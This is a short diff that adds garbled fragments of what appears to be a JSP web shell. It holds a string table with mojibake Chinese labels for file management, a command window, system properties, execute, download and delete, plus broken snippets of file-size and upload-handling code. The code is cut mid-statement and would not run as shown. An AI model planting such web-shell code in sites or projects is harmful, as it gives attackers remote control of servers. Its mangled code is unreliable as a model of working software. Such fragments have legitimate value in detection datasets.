@@ -1,0 +1,13 @@
+<%/**%>
+{"�� �� �� ��","File Management"};{"CMD �� ��","Command Window"};{"ϵ ͳ �� ��","System Property"};
+{"�� ��","Help"}; {"�ϼ�Ŀ¼","Parent Folder"};"��ǰĿ¼","Current Folder"}; {"������","Drivers"};
+{"�ļ�����","File Name"};{"�ļ���С","File Size"};{"����޸�","Last Modified"};"�ļ�����","Operations"};
+"�޸�","Edit"};{"����","Download"};{"����","Move"}; {"ɾ��","Delete"};{"ִ��","Execute"};{"����","Back"};{"����","Save"};
+long time = (System.currentTimeMillis() - starttime) / 1000l;
+strUnit="Bytes"f(intDivisor==1) return filesize + " " + strUnit;
+rAfterComma = "" + 100 * (filesize % intDivisor) / intDivisor ;
+return filesize / intDivisor + "." + strAfterComma + " " + strUnit;
+sbDown.append("�ļ���СΪ 0 �ֽڣ��Ͳ������˰�");
+FileInfo fi = (FileInfo) ht.get("cqqUploadFile");
+File f1 = fi.file;UplInfo info = UploadMonitor.getInfo(fi.clientFileName);
+error,upload
